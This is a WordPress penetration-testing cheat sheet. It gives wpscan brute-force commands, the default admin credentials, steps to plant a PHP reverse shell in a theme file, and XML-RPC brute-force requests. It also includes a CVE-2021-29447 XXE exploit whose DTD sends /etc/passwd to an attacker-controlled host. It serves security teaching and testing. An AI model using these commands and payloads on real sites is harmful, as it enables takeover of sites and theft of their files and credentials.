---
title: WordPress Pentesting
description: WordPress is a content management system.
tags:
    - CMS
    - Web
refs:
date: 2022-12-20
draft: false
---

## Automation

**[Wpscan](https://github.com/wpscanteam/wpscan)** is a WordPress security scanner which can brute force credentials.

```sh
wpscan --url http://<target-ip> -P wordlist.txt

# --rua: random user agent
# --http-auth username:password
# -e: enumerate
#  ap: All plugins
#  at: All themes
#  tt: Timthumbs
#  cb: Config backups
#  dbe: Db exports
#  u: User IDs range
#  m: Media IDs range
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.com -P /usr/share/wordlists/rockyou.txt

# Specifify username (-U)
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.com -U username -P /usr/share/wordlists/rockyou.txt
```

<br />

## Get WordPress Version

There is the meta tag for WordPress in the head tag of the HTML source code.

```html
<meta name="generator" content="WordPress x.x.x" />
```

<br />

## Common Directories

```sh
/author/admin/
/index.php/author/admin/
/license.txt
/readme.html
/robots.txt

/wp-admin/
/wp-admin/admin-ajax.php
/wp-admin/upload.php
/wp-content/
/wp-content/uploads/
/wp-includes/

/?author=1
/?author=2

# Private/Draft Posts (WordPress <= 5.2.3) 
/?static=1
```

<br />

## Try to Login with Default Credential

Access to **/wp-login.php** and use the default credential in the login form.

```txt
admin:password
```

<br />

## PHP Reverse Shell Injection

It's required the **"admin" credentials.**

1. Access to dashboard (**/wp-admin/**).
2. Move to **"Appearance"** and select theme e.g. "Twenty Seventeen".
3. Click **"Theme Editor"** or **"Editor"** in the **"Appearance"** section.
4. In the theme editor, click **"404 Template (404.php)"** on the right.
5. Copy and paste the script for Reverse Shell [here](https://github.com/pentestmonkey/php-reverse-shell).
6. Edit **"$ip"** and **"$port"** to assign local machine ip and port in the script.
7. In your terminal, start netcat listener for getting the incoming connection from the website.

    ```sh
    nc -lvnp <local-port>
    ```

8. Access "https://vulnerable.com/wp-content/themes/twentyseventeen/404.php". We should get the target shell in the netcat listener.

<br />

## XML-RPC (xmlrpc.php)

- **Get All Methods**

    ```xml
    POST /xmlrpc.php HTTP/1.1
    Host: vulnerable.com
    ...

    <?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>system.listMethods</methodName> 
    <params></params> 
    </methodCall>
    ```

- **Ping Back**

    Use **[PostBin](https://www.toptal.com/developers/postbin/)** to confirm the results.

    ```xml
    POST /xmlrpc.php HTTP/1.1
    Host: vulnerable.com
    ...

    <?xml version="1.0" encoding="utf-8"?>
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params>
    <param><value><string>https://www.toptal.com/developers/postbin/xxxxxxxxxxxxx-xxxxxxxxxxxxx</string></value></param>
    <param><value><string>http://vulnerable.com</string></value></param>
    </params>
    </methodCall>
    ```

- **User Enumeration**

    Itâ€™s recommended to use Burp Intruder or Turbo Intruder for brute forcing username/password.

    ```xml
    POST /xmlrpc.php HTTP/1.1
    Host: vulnerable.com
    ...

    <?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>wp.getUsersBlogs</methodName> 
    <params>
    <param><value>{username}</value></param>
    <param><value>{password}</value></param>
    </params> 
    </methodCall>
    ```

<br />

## XXE (CVE-2021-29447)

If you have a normal user credential, upload the exploitable media (.WAV) with XXE and reveal sensitive information.  
First off, create **"exploit.wav"**.

```sh
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://<local-ip>:9001/exploit.dtd'"'"'>%remote;%init;%trick;] >\x00'> exploit.wav
```

Next create **"exploit.dtd"**.

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://<local-ip>:9001/?p=%file;'>">
```

Then start PHP server in local machine.

```sh
php -S 0.0.0.0:9001
```

In target website, login as normal user and go to **"Media"**, click **"Add New"**.  
Upload the **"exploit.wav"**.  
After that, open the WAV file. You should see the information is revealed in your console. Decode it.